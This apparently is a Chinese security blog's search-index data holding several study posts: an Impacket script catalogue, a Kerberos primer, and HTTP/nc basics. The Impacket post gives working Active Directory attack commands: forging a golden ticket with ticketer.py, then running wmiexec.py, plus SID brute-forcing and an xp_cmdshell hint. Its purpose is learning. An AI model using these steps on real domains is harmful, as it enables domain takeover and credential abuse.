wmipersist.py： 此脚本创建/删除wmi事件使用者/筛选器，并在两者之间建立链接，以基于指定的wql筛选器或计时器执行Visual Basic Basic ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:5","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"已知的漏洞 goldenPac.py： 利用MS14-068。保存Golden Ticket并在目标位置启动PSExec会话 sambaPipe.py：该脚本将利用CVE-2017-7494，通过-so参数上传和执行用户指定的共享库。 smbrelayx.py：利用SMB中继攻击漏洞CVE-2015-0005。如果目标系统正在执行签名并且提供了计算机帐户，则模块将尝试通过NETLOGON收集SMB会话密钥。 利用SMB中继攻击漏洞CVE-2015-0005 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:6","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"SMB / MSRPC smbclient.py：一个通用的SMB客户端，可以允许您列出共享和文件名，重命名，上传和下载文件，以及创建和删除目录，所有这些都是使用用户名和密码或用户名和哈希组合。这是一个很好的例子，可以了解到如何在实际中使用impacket.smb getArch.py：此脚本将与目标（或目标列表）主机连接，并使用文档化的msrpc功能收集由（ab）安装的操作系统体系结构类型。 rpcdump.py：此脚本将转储目标上注册的RPC端点和字符串绑定列表。它还将尝试将它们与已知端点列表进行匹配。 ifmap.py：此脚本将绑定到目标的管理接口，以获取接口ID列表。它将在另一个界面UUID列表上使用这个列表，尝试绑定到每个接口并报告接口是否已列出或正在侦听。 opdump.py：这将绑定到给定的hostname:port和msrpc接口。然后，它尝试依次调用前256个操作号中的每一个，并报告每个调用的结果。 samrdump.py：从MSRPC套件与安全帐户管理器远程接口通信的应用程序中。它列出了通过此服务导出的系统用户帐户、可用资源共享和其他敏感信息 services.py：此脚本可用于通过[MS-SCMR] MSRPC接口操作Windows服务。它支持启动，停止，删除，状态，配置，列表，创建和更改。 netview.py：获取在远程主机上打开的会话列表，并跟踪这些会话在找到的主机上循环，并跟踪从远程服务器登录/退出的用户 reg.py：通过[ms-rrp]msrpc接口远程注册表操作工具。其想法是提供与reg.exe Windows实用程序类似的功能。 lookupsid.py：通过[MS-LSAT] MSRPC接口的Windows SID暴力破解程序示例，旨在查找远程用户和组 # 语法: ./lookupsid.py [[domain/] username [: password] @] [Target IP Address] ./lookupsid.py SERVER/Administrator: T00r@192.168.1.140 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:7","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"MSSQL / TDS mssqlinstance.py：从目标主机中检索MSSQL实例名称。 mssqlclient.py：MSSQL客户端，支持SQL和Windows身份验证（哈希）。它还支持TLS。 # 登录mysql python mssqlclient.py domain/user@ip address -windows-auth #select is_srvrolemember(‘sysadmin’) 判断是否有系统权限 #如果权限够高可以开启xp_cmdshell来执行系统命令 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:8","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"文件格式 esentutl.py：Extensibe存储引擎格式实现。它允许转储ESE数据库的目录，页面和表（例如NTDS.dit） ntfs-read.py:NTFS格式实现。此脚本提供了一个用于浏览和提取NTFS卷的功能小的反弹shell，包括隐藏/锁定的内容 registry-read.py：Windwows注册表文件格式实现。它允许解析脱机注册表配置单元 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:9","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"其他 GetADUsers.py：此脚本将收集有关域用户及其相应电子邮件地址的数据。它还将包括有关上次登录和上次密码设置属性的一些额外信息。 mqtt_check.py：简单的MQTT示例，旨在使用不同的登录选项。可以很容易地转换成帐户/密码暴力工具。 rdp_check.py：[MS-RDPBCGR ]和[MS-CREDSSP]部分实现只是为了达到CredSSP身份验证。此示例测试帐户在目标主机上是否有效。 sniff.py：简单的数据包嗅探器，使用pcapy库来监听在指定接口上传输的包。 sniffer.py：简单的数据包嗅探器，它使用原始套接字来侦听与指定协议相对应的传输中的数据包。 ping.py：简单的ICMP ping，它使用ICMP echo和echo-reply数据包来检查主机的状态。如果远程主机已启动，则应使用echo-reply数据包响应echo探针。 Use: ./ping.py \u003csrc ip\u003e \u003cdst ip\u003e ping6.py：简单的IPv6 ICMP ping，它使用ICMP echo和echo-reply数据包来检查主机的状态。 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:4:10","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["渗透测试"],"content":"黄金票据的制作 第一步：打开管理员权限的命令行窗口并清空票据 klist purge 第二步：制作ccache文件 python ticketer.py -nthash d8d2ad72a119a8d418703f7a16580af6 -domain-sid S-1-5-21-3763276348-88739081-2848684050 -domain test.com administrator 第三步：更改环境变量 set KRB5CCNAME=C:\\Users\\zhangsan\\Desktop\\impacket-examples-windows-master\\administrator.ccache 第四步：验证成果 python wmiexec.py test.com/administrator@yukong -k -no-pass 利用impacket来进行票据的制作有一定的局限性，制作完票据后在klist命令下是看不到缓存的。也没办法使用net use \\ip\\admin$ 来建立管道连接。但可以使用其自带的工具在在一定的命令格式下进行远控指定主机。命令格式为： xxxx.py domain/username@hostname -k -no-pass 参考：https://shanfenglan.blog.csdn.net/article/details/108266378 ","date":"2022-05-09","objectID":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/:5:0","tags":["Impacket","渗透","渗透工具","网络协议"],"title":"Impacket库学习","uri":"/impacket%E5%BA%93%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法一：通过ssh连接运行的docker容器 跟连接普通Linux的ssh一样，可以参考如下文章： https://blog.csdn.net/m0_60827485/article/details/122826522 ","date":"2022-05-07","objectID":"/pycharm%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/:1:0","tags":["远程调试","docker"],"title":"pycharm连接远程服务器docker容器运行和调试代码","uri":"/pycharm%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/"},{"categories":["Python"],"content":"方法2：pycharm连接docker镜像，pycharm运行代码再自动创建容器 https://blog.csdn.net/Thanours/article/details/109271836 ","date":"2022-05-07","objectID":"/pycharm%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/:2:0","tags":["远程调试","docker"],"title":"pycharm连接远程服务器docker容器运行和调试代码","uri":"/pycharm%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8docker%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E5%92%8C%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/"},{"categories":["渗透测试"],"content":"Kerberos协议简介 Kerberos协议是一个专注于验证通信双方身份的网络协议，不同于其他网络安全协议的保证整个通信过程的传输安全，kerberos侧重于通信前双方身份的认定工作，确保通信双方身份的真实性和安全性，帮助客户端和服务端解决“证明我自己是我自己”的。 不同与其它网络服务，kerberos协议中不是所有的客户端向想要访问的网络服务发起请求，他就能够建立连接然后进行加密通信。而是在发起服务请求后必须先进行一系列的身份认证，包括客户端和服务端两方的双向认证，只有当通信双方都认证通过对方身份之后，才可以互相建立起连接，进行网络通信。即kerberos协议的侧重在于认证通信双方的身份，客户端需要确认即将访问的网络服务就是自己所想要访问的服务而不是一个伪造的服务器，而服务端需要确认这个客户端是一个身份真实，安全可靠的客户端，而不是一个想要进行恶意网络攻击的用户。 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:1:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"Kerberos协议解决什么问题 简单地说，Kerberos提供了一种单点登录(SSO)的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供一个中心认证服务器（AS-Authentication Server）供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:2:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"Kerberos协议角色 在Kerberos系统中至少有三个角色，三者缺一不可： 客户端（client）：发送请求的一方 服务端（Server）：接收请求的一方 密钥分发中心（Key Distribution Center，KDC），KDC 服务默认会安装在一个域的域控中。而密钥分发中心一般又分为两部分，分别是： AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）（验证 Client 端的身份，验证通过就会给一张 TGT票给 Client） TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）（通过 AS 发送给 Client 的票（TGT）换取访问 Server 端的票） ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:3:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"简化的Kerberos认证流程 举个例子，A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如果A直接去找B告诉B我就是A，那么B是有理由不相信A的，因为即使A是一个冒充的他也分辨不清，B同理也得不到A的认可，他们陷入了一个无法证明我就是我的困境。于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且这个C既认识A又认识B，所以只要C告诉B，这个A确实就是真正的A那么B就会 信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找C，便可以得到C的确认了。 在上面的例子中，A，B分别是客户端和服务端，C担任的角色便是KDC，全称Key Distribution Center，中文名叫做密钥分发中心。KDC中包含一个叫做TGS（票据授予中心）的组件，我们便可以理解为他就是一个发放身份认证票据的服务中心，在KDC认证了（其实是KDC中的AS认证的）客户端的身份后，他会给客户端发放用于访问网络服务的服务授予票据（Ticket）。由于整个kerberos通信过程都采用对称加密的方式，密钥的获取也是从KDC中得到，所以KDC叫做密钥分发中心。 客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步： 1.客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；（解决两个问题：KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？） 2.客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；（服务端怎么知道你带来的服务授予票据（Ticket）就是一张真正的票据呢？） ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:4:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"Kerberos协议认证流程 几个Kerberos认证的前提条件： 1.kerberos协议他是一个“限权”的认证协议，kerberos中会自带一个数据库，这个数据库会由创建kerberos的运维人员提前在库中添加好整个系统中拥有使用kerberos认证权限的用户和网络服务。在后续的认证中也是根据数据库中是否存在该用户和服务来判断该对象是否能够通过认证服务的。（拿上面的例子来说就是上帝先让C在AB相识之前同时认识A和B，以便后面帮助AB互相认证） 2.所有使用kerberos协议的用户和网络服务，在他们添加进kerberos系统中时，都会根据自己当前的密码（用户密码，人为对网络服务随机生成的密码）生成一把密钥存储在kerberos数据库中，且kerberos数据库也会同时保存用户的基本信息（例如用户名，用户IP地址等）和网络服务的基本信息（IP，Server Name） 3.kerberos中存在的三个角色，只要是发生了两两之间的通信，那么都需要先进行身份的认证 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:5:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"第一次通信 为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端，过程如下： ① 客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳； ② KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性； ③ 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容： 第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端 即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。 第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。 至此，第一次通信完成。 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:5:1","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"第二次通信 此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求， 其次请求的主要目的是为了获取能够访问目标网络服务的服务授予票据Ticket（进入动物园需要的门票）。 在第二次通信请求中，客户端将携带三部分内容交给KDC中的TGS，第二次通信过程具体如下所述： 客户端行为： ① 客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳； ② 客户端将自己想要访问的Server服务以明文的方式发送给KDC； ③ 客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC； TGS行为： ① 此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。 ② TGS使用自己的密钥(krbtgt hash)将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。 ③ 如果时延正常，则TGS会使用CK_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步(这一步不管用户有没有对服务的访问权限，只要TGT是正确的，就会返回TGS票据)。 ④ 此时KDC将返回响应给客户端，响应内容包括： 第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK（Session Key）。 第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。 至此，第二次通信完成。 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:5:2","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"第三次通信 此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。 客户端： ① 客户端使用CK_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。 服务端： ① 服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。 至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:5:3","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"总结 整个kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session Key，即他们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。 这为整个kerberos认证过程保证了较高的安全性。以下补充两个kerberos认证的整体流图，一个是kerberos认证的时序图，一个是kerberos认证的示意图。 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:6:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["渗透测试"],"content":"参考 基本都是参考：https://blog.csdn.net/weixin_38233104/article/details/122963237 https://blog.csdn.net/jewes/article/details/20792021?spm=1001.2101.3001.6650.2\u0026utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_paycolumn_v3\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2.pc_relevant_paycolumn_v3\u0026utm_relevant_index=5 ","date":"2022-05-01","objectID":"/kerberos%E5%85%A5%E9%97%A8/:7:0","tags":["Kerberos","内网","网络协议"],"title":"Kerberos入门","uri":"/kerberos%E5%85%A5%E9%97%A8/"},{"categories":["计算机网络"],"content":"抓取数据包 随机抓取了bilibili的一段POST数据包： ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:1:0","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"发送HTTP请求 一个请求由四个部份组成：请求行、请求头标、空行和请求数据。 每个部分之间用\\r\\n来隔开 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:2:0","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"1.请求行 请求行由三个标记组成：请求方法、请求URL和HTTP版本，它们用空格分隔。 例如： GET /index.html HTTP/1.1 HTTP 定义了8种可能的请求方法： GET：检索URL中标识资源的一个简单请求 HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档 POST：服务器接受被写入客户端输出流中的数据的请求 PUT：服务器保存请求数据作为指定URL新内容的请求 DELETE：服务器删除URL中命令的资源的请求 OPTIONS：关于服务器支持的请求方法信息的请求 TRACE：web服务器反馈Http请求和其头标的请求 CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:2:1","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"2.请求头标 由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。典型的请求头标有： User-Agent：客户端厂家和版本 Accept：客户端可识别的内容类型列表 Content-Length：附加到请求的数据字节数 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:2:2","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"3.空行 最后一个请求头标之后是一个空行，发送回车符和退行，通知服务器以下不再有头标。 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:2:3","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"4.请求数据 使用POST传送数据，最常使用的是Content-Type和 Content-Length 头标。 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:2:4","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"服务器接受请求并返回HTTP响应 一个响应由四个部分组成；状态行、响应头标、空行、响应数据。 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:3:0","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"1.状态行 状态行由三个标记组成：HTTP版本、响应代码和响应描述。 HTTP版本：向客户端指明其可理解的最高版本。 响应代码：3位的数字代码，指出请求的成功或失败，如果失败则指出原因。 响应描述：为响应代码的可读性解释。 例如： HTTP/1.1 200 OK HTTP响应码： 1xx：信息，请求收到，继续处理 2xx：成功，行为被成功地接受、理解和采纳 3xx：重定向，为了完成请求，必须进一步执行的动作 4xx：客户端错误 5xx：服务器错误 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:3:1","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":".响应头标 像请求头标一样，它们指出服务器的功能，标识出响应数据的细节。 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:3:2","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"3.空行 最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标。 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:3:3","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"4.响应数据 HTML文档和图像等，也就是HTML本身。 200 存在文件 403 存在文件夹 404 不存在文件及文件夹 500 服务器内部错误 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:3:4","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"服务器关闭连接，浏览器解析响应 1.浏览器首先解析状态行，查看表明请求是否成功的状态代码。 2.然后解析每一个响应头标，头标告知以下为若干字节的HTML。 3.读取响应数据HTML，根据HTML的语法和语义对其进行格式化，并在浏览器窗口中显示它。 4.一个HTML文档可能包含其它需要被载入的资源引用，浏览器识别这些引用，对其它的资源再进行额外的请求，此过程循环多次。 HTTP模型是无状态的，表明在处理一个请求时，Web服务器并不记住来自同一客户端的请求。 ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:4:0","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"使用nc模拟http请求 netcact工具用途很多，可以翻看这篇文章：http://www.xpshuai.cn/2020/03/15/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/ 这里只说用nc模拟http请求，以请求百度为例 1.输入要请求的主机和端口号nc www.baidu.com 80 2.手工填写请求方式和请求头等（比如下面我请求百度的robots.txt文件）： GET /robots.txt HTTP/1.1 Host: www.baidu.com 当然也可以用如下形式的一行命令搞定： # -e参数是激活转义字符，请求中不同行使用\\r\\n隔开，然后通过管道重定向给nc echo -e \"GET /robots.txt HTTP/1.1\\r\\nHost: www.baidu.com\\r\\n\\r\\n\" | nc www.baidu.com 80 以此类推，当然我们也可以提前把请求写好放到文件中，然后读取文件再通过管道重定向给nc 但是要注意不同系统的换行符是有区别的，如果需要用记得转换一下： Windows系统里，文件每行结尾是\"\"\"\\r\\n\" Mac系统里， 文件每行结尾是\"\"，即’\\r' Unix系统里， 文件每行结尾是\"\"，即’\\n' ","date":"2022-04-30","objectID":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/:5:0","tags":["http","数据包"],"title":"http数据包浅析","uri":"/http%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B5%85%E6%9E%90/"},{"categories":["计算机网络"],"content":"HTTP简介 HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等） ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:1:0","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"HTTP1.0和1.1的差别 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:2:0","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"1.长连接 长连接（HTTP persistent connection ，也有翻译为持久连接），指数据传输完成了保持TCP连接不断开（不发RST包、不四次握手），等待在同域名下继续用这个通道传输数据；相反的就是短连接。 HTTP1.1支持长连接和请求的流水线（Pipelining）处理，并且默认使用长连接，如果加入\"Connection: close “，才关闭。 HTTP 1.0默认使用短连接，规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪，每个客户也不记录过去的请求。要建立长连接，可以在请求消息中包含Connection: Keep-Alive头域，如果服务器愿意维持这条连接，在响应消息中也会包含一个Connection: Keep-Alive的头域。 ","date":"2022-04-30","objectID":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/:2:1","tags":["http协议","http1.0","http1.1","http2"],"title":"http1.0和http1.1和http2的区别","uri":"/http1-0%E5%92%8Chttp1-1%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"categories":["计算机网络"],"content":"2.HOST域 